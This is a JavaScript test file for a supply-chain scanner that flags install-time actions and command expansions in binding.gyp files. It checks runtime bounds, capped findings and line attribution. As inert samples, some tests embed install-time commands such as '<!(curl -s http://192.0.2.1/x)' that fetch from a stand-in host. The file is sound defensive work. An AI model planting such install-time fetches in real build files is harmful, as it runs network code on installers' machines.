// Review regressions: scanGyp (twin of core.scan_gyp) was quadratic (8,000
// actions: 1.3 s here, 11.4 s in core; 4,000 expansions in one string: 0.5 s
// here, 29.5 s in core), stopped silently at its node cap, and reported an
// action on the first line holding any token of its command. Lines are now
// computed once, each line redacted once, expansions matched in one pass,
// the command text per file bounded, at most GYP_MAX_HOOK_FINDINGS findings
// listed plus one summing up the rest, a walk stopped by a bound is
// SC-TRUNCATED, and an action is reported on its own "action" key. Every
// expectation equals core.scan_gyp's result (test_review_gyp). Inert input.

import { test } from "node:test";
import assert from "node:assert/strict";
import { scanGyp } from "../src/index.js";
import { GYP_MAX_HOOK_FINDINGS } from "../src/lib/supplychain.js";

const actions = (n) => "{'targets': [{'target_name': 'x', 'actions': [\n" +
  Array.from({ length: n }, (_, i) => `    {'action_name': 'a', 'action': ['t${String(i).padStart(6, "0")}']}`).join(",\n") +
  "\n]}]}\n";
const expansions = (n, cmd = "echo base64") => "{'variables': {'v': '" + `<!(${cmd})`.repeat(n) + "'}}";
const brief = (issues) => issues.map((i) => [i.rule, i.line, i.sev]);

test("linear in the size of the file", () => {
  for (const [label, text] of Object.entries({
    "80,000 actions": actions(80000),
    "80,000 expansions in one string": expansions(80000),
    "20,000 unclosed expansions in one string": "{'v': '" + "<!(".repeat(20000) + "curl x'}",
  })) {
    const t0 = performance.now();
    scanGyp("binding.gyp", text);
    const ms = performance.now() - t0;
    assert.ok(ms < 4000, `${label}: ${ms.toFixed(0)} ms`);
  }
});

test("many actions are listed in part; the summary keeps the highest severity", () => {
  const hooks = scanGyp("binding.gyp", actions(500)).filter((i) => i.rule === "SC-INSTALL-HOOK");
  assert.equal(GYP_MAX_HOOK_FINDINGS, 100);
  assert.equal(hooks.length, 101);
  assert.deepEqual(hooks.slice(0, -1).map((i) => i.line), Array.from({ length: 100 }, (_, k) => k + 2));
  const summary = hooks.at(-1);
  assert.deepEqual([summary.sev, summary.line, summary.cmd], ["MAJOR", 102, undefined]);
  assert.equal(summary.msg, "400 more binding.gyp actions and command expansions run code at install time " +
    "(0 of them look hostile); only the first 100 are listed.");
  const bad = scanGyp("binding.gyp", actions(150).replace("['t000140']", "['curl', 'http://192.0.2.1/x']")).at(-1);
  assert.equal(bad.sev, "CRITICAL");
  assert.match(bad.msg, /^50 more binding\.gyp actions .*\(1 of them look hostile\)/);
  const exp = scanGyp("binding.gyp", expansions(250, "curl -s http://192.0.2.1/x"));
  assert.equal(exp.length, 101);
  assert.deepEqual(brief(exp).at(-1), ["SC-INSTALL-HOOK", 1, "CRITICAL"]);
});

test("a walk stopped by a bound is SC-TRUNCATED, not silently clean", () => {
  const base = "{'targets': [{'target_name': 'x', 'actions': [{'action_name': 'a', 'action': ['echo', 'marker']}]}]";
  assert.deepEqual(brief(scanGyp("binding.gyp", base + "}")), [["SC-INSTALL-HOOK", 1, "MAJOR"]]);
  const big = scanGyp("binding.gyp", base + ", 'variables': {'list': [" + "'v', ".repeat(100000) + "]}}");
  assert.deepEqual(big.filter((i) => i.rule === "SC-TRUNCATED").map((i) => [i.sev, i.msg]),
    [["CRITICAL", "File not fully scanned: more than 100000 values in the gyp document."]]);
  const long = scanGyp("binding.gyp", "{'v': '" + "<!(".repeat(20000) + "curl x'}");
  assert.equal(long.at(-1).msg, "File not fully scanned: more than 2000000 characters of gyp commands.");
  assert.ok(long.length < 60);
});

test("an action is reported on the line of its own \"action\" key", () => {
  const text = "{\n 'targets': [{\n  'target_name': 'echo',\n  'sources': ['marker.cc'],\n" +
    "  'actions': [{\n   'action_name': 'gen', 'action': ['echo', 'marker']}]}]}\n";
  assert.deepEqual(brief(scanGyp("binding.gyp", text)), [["SC-INSTALL-HOOK", 6, "MAJOR"]]);
  const json = JSON.stringify({ targets: [{ target_name: "echo", actions: [
    { action_name: "a", action: ["echo", "one"] }, { action: ["echo", "two"] }] }] }, null, 2);
  const want = json.split("\n").flatMap((l, k) => (l.includes('"action"') ? [k + 1] : []));
  assert.deepEqual(scanGyp("binding.gyp", json).map((i) => i.line), want);
  const literal = "# c\n{'targets': [{'x': '''a\rb\r\nc''',\n 'action': ['echo', 'first'],\n" +
    " 'action': ['echo', 'second']},\n {('action'): ['echo', 'third']},\n {'act'\n  'ion': ['echo', 'fourth']}]}\n";
  assert.deepEqual(scanGyp("binding.gyp", literal).map((i) => [i.line, i.cmd]).sort(),
    [[5, "echo second"], [6, "echo third"], [7, "echo fourth"]]);
  const exp = "{'a': 'x',\n 'b': ['<!(curl -s http://192.0.2.1/x)'],\n 'c': '<!(curl -s http://192.0.2.1/x)'}\n";
  assert.deepEqual(brief(scanGyp("binding.gyp", exp)), [["SC-INSTALL-HOOK", 2, "CRITICAL"], ["SC-INSTALL-HOOK", 2, "CRITICAL"]]);
});
